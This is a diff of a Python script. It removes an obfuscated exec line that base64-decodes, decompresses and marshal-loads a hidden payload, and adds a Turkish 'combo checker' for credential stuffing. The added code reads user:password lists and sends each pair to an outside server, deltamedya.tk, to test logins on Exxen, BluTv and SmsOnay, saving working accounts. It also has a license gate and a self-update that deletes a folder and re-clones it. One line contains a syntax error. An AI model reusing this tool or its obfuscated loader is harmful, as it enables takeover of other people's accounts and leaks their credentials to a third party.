@@ -1,1 +1,141 @@
-_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'==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'))
+import random
+import os
+import time
+import requests
+from time import sleep
+from colorama import Fore
+import time 
+say=0
+dsy=""
+n = '\033[1;35m'
+j = '\033[1;36m'
+o = '\033[1;31m'
+Y  = Fore.YELLOW
+dir='/sdcard/combo/'
+banner=("""\33[31m
+  ___ ___ _____    ____  _ ___ ____  _____ ___  
+ |_  | __|_   _|  / _/ || | __/ _/ |/ / __| _ \ 
+  / /| _|  | |   | \_| >< | _| \_|   <| _|| v / 
+ |___|___| |_|    \__/_||_|___\__/_|\_\___|_|_\ 
+\33[0m""")
+def basla():
+    os.system("clear")
+    print(banner)
+    print("""\33[31m
+    [1] Exxen
+    [2] BluTv
+    [3] SmsOnay.Com
+    """)
+    hesap= input("Sayı Giriniz :\33[0m")
+    if hesap=="1":
+        exxen()
+    elif hesap=="2":
+        blutv()
+    elif hesap=="3":
+        smsonay()
+    else:
+        quit()
+def exxen():
+    while True:
+        os.system("clear")
+        print(banner)
+        dosya= input("Combo ismi Gir [.txt Olmadan] :")
+        hit= input("Hit Kayıtedilcek Dosya ismi Gir [.txt Olmadan] :")
+        dosyaa= dosya + '.txt'
+        hit2= hit + '.txt'
+        for mp in open(dosyaa,'r').read().splitlines():
+            mp=mp.replace("\n","")
+            user = mp.split(':')[0]
+            pasw = mp.split(':')[1]
+            dosyaa= dosya + '.txt'
+            url = f'https://deltamedya.tk/api/exxen.php?lista={user}:{pasw}'
+            req = requests.post(url).text
+            if "#Onaylandı" in req:
+                dosya=open(hit2, 'a')
+                dosya.write(user+':'+pasw+' Checker By @ZetTekno - @yusiqo'+'\n')
+                print(f'[=] Live: {user}{pasw}')
+            else:
+                print(f"Başarısız: {user}:{pasw}")
+def blutv():
+    while True:
+        os.system("clear")
+        print(banner)
+        dosya= input("Combo ismi Gir [.txt Olmadan] :")
+        hit= input("Hit Kayıtedilcek Dosya ismi Gir [.txt Olmadan] :")
+        dosyaa= dosya + '.txt'
+        hit2= hit + '.txt'
+        for mp in open(dosyaa,'r').read().splitlines():
+            mp=mp.replace("\n","")
+            user = mp.split(':')[0]
+            pasw = mp.split(':')[1]
+            dosyaa= dosya + '.txt'
+            url = f'https://deltamedya.tk/api/blu.php?lista={user}:{pasw}'
+            req = requests.post(url).text
+            if "#Onaylandı" in req:
+                dosya=open(hit2, 'a')
+                dosya.write(user+':'+pasw+' Checker By @ZetTekno - @yusiqo'+'\n')
+                print(f'[=] Live: {user}{pasw}')
+            else:
+                print(f"Başarısız: {user}:{pasw}")
+def smsonay():
+    while True:
+        os.system("clear")
+        print(banner)
+        dosya= input("Combo ismi Gir [.txt Olmadan] :")
+        hit= input("Hit Kayıtedilcek Dosya ismi Gir [.txt Olmadan] :")
+        dosyaa='/combo/' dosya + '.txt'
+        hit2= '/hit/' + hit + '.txt'
+        for mp in open(dosyaa,'r').read().splitlines():
+            mp=mp.replace("\n","")
+            user = mp.split(':')[0]
+            pasw = mp.split(':')[1]
+            dosyaa= dosya + '.txt'
+            url = f'https://deltamedya.tk/api/smsonay.php?lista={user}:{pasw}'
+            req = requests.post(url).text
+            if "#Onaylandı" in req:
+                dosya=open(hit2, 'a')
+                dosya.write(user+':'+pasw+' Checker By @ZetTekno - @yusiqo'+'\n')
+                print(f'[=] Live: {user}{pasw}')
+            else:
+                print(f"Başarısız: {user}:{pasw}")
+os.system("clear")
+url= 'https://raw.githubusercontent.com/yusiqo/OpMob/main/version'
+response= requests.get(url).text
+filad="keys.txt"
+version=(response)
+ver=open('version','r+')
+fayl=(ver.read())
+if fayl == version:
+    os.system("clear")
+    print(banner)
+    print("""
+    """)
+    print("Bedava Lisans Kodu İçin Telegram Gurubumuza Sadece 'lisans' Yazmanız Yeterlidir")
+    print("""
+    """)
+    lisans= input("Lütfen Lisans Kodunu Giriniz :")
+    keys=(lisans)
+    url2 = 'https://deltamedya.tk/lisans.html'
+    req2 = requests.post(url2).text
+    kod=(req2)
+    dosya=open(filad,'a') 
+    dosya.close()
+    dosya=open(filad,'r+') 
+    if dosya.read() == kod:
+        print("Oto Giriş Başarılı")
+        basla()
+    if lisans == kod:
+        print("Başarılı")
+        dosya=open(filad,'w+') 
+        dosya.write(keys)
+        dosya.close()
+        basla()
+    else:
+        print("Yanlış")
+        exit()
+        os.system("exit")
+else:
+    os.system("figlet Gunceleme..")
+    print("Otomatik Güncelleme Yapılıyor......")
+    time.sleep(4)
+    os.system("cd && rm -rf OpMob && git clone https://github.com/yusiqo/OpMob && cd OpMob")
